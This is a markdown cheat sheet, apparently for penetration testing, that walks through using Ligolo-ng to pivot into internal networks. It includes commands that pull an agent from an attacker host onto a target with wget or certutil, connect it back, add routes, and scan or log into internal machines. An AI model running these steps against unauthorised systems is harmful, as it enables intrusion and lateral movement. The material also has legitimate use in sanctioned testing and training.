# Pivoting – Ligolo-ng

## Purpose

This file provides a structured workflow for using Ligolo-ng to pivot into internal networks using a TUN interface.

Core rules:
- Ligolo provides full network access (not just port forwarding)
- Uses a virtual network interface (TUN)
- Allows native tool usage (nmap, smbclient, etc.)
- More powerful than SOCKS-based pivoting

---

## 0. Mental Model

You create a virtual network interface on your attacker machine.

Traffic flows like:

[ATTACKER] ⇄ [TUN INTERFACE] ⇄ [AGENT] ⇄ [INTERNAL NETWORK]

To your tools:
→ internal network looks directly connected

---

## 1. Components

- ligolo-proxy (attacker)
- ligolo-agent (target)

---

## 2. Start Proxy (ATTACKER)

./proxy -selfcert

OR specify port:

./proxy -selfcert -laddr 0.0.0.0:11601

---

## 3. Transfer Agent

python3 -m http.server 8000

On target:

wget http://<ATTACKER_IP>:8000/agent.exe

OR:

certutil -urlcache -split -f http://<ATTACKER_IP>:8000/agent.exe agent.exe

---

## 4. Start Agent (TARGET)

./agent.exe -connect <ATTACKER_IP>:11601 -ignore-cert

---

## 5. Create TUN Interface (ATTACKER)

sudo ip tuntap add user $(whoami) mode tun ligolo

sudo ip link set ligolo up

---

## 6. Start Session (PROXY CONSOLE)

Inside proxy:

session

Select agent

---

## 7. Start Tunnel

start

---

## 8. Add Route to Internal Network (CRITICAL)

Example:

sudo ip route add 10.10.0.0/24 dev ligolo

---

## 9. Verify Connectivity

ping 10.10.0.1

---

## 10. Use Native Tools (BIG ADVANTAGE)

nmap -sT -Pn 10.10.0.5

smbclient -L //10.10.0.5

evil-winrm -i 10.10.0.5 -u user -p password

---

## 11. Multiple Networks

Add additional routes:

sudo ip route add 172.16.0.0/16 dev ligolo

---

## 12. Remove Route (Cleanup)

sudo ip route del 10.10.0.0/24

---

## 13. Background Sessions

You can maintain multiple agents and switch between them

---

## 14. Common Use Cases

- Active Directory enumeration
- internal SMB scanning
- RDP access
- web application testing
- lateral movement

---

## 15. Common Failure Points (CRITICAL)

- forgetting to add route
- wrong subnet
- TUN interface not up
- firewall blocking connection
- using ICMP when blocked

---

## 16. If Ping Fails

Try:

nmap -Pn <target>

ICMP often blocked

---

## 17. Troubleshooting Checklist

- agent connected?
- TUN interface up?
- route added?
- correct subnet?
- correct internal IP?

---

## 18. Quick Exploit Pattern

1. start proxy
2. upload agent
3. connect agent
4. create TUN interface
5. start tunnel
6. add route
7. scan internal network

---

## 19. Mental Model

Agent = foothold  
TUN = bridge  
Route = direction  
Tools = direct access  

---

## 20. Golden Rules

- Always add route (most common failure)
- Use correct subnet (not /32 unless needed)
- Prefer TCP scans (nmap -sT -Pn)
- Ligolo = near-native access (use it fully)
- Keep chisel as fallback